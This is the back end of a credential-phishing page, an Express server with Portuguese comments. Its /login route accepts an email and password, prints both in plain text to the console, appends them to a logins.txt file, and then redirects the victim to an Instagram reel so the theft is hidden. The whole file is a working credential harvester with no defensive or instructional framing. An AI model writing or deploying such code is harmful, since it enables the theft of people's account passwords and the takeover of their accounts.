const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 10000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); // pasta onde vai ficar seu index.html e imagem

// Rota de login
app.post('/login', (req, res) => {
  const { email, senha } = req.body;

  console.log('🔄 Requisição recebida: POST /login');
  console.log("\n====================== NOVO LOGIN ======================");
  console.log(`📧 Email: ${email}`);
  console.log(`🔑 Senha: ${senha}`);
  console.log("========================================================\n");

  salvarLogin(email, senha);

  // Redireciona para o vídeo
  res.redirect('https://www.instagram.com/reel/DJUlfcKMsz0/?igsh=cTZhYm5iMnd2NDNu');
});

// Função para salvar logins
function salvarLogin(email, senha) {
  const data = `🕒 ${new Date().toLocaleString()} | 📧 Email: ${email} | 🔑 Senha: ${senha}\n`;
  fs.appendFile(path.join(__dirname, 'logins.txt'), data, (err) => {
    if (err) console.error('❌ Erro ao salvar login:', err);
    else console.log('✅ Login salvo em logins.txt');
  });
}

app.listen(port, () => {
  console.log(`🚀 Servidor rodando na porta ${port}`);
});
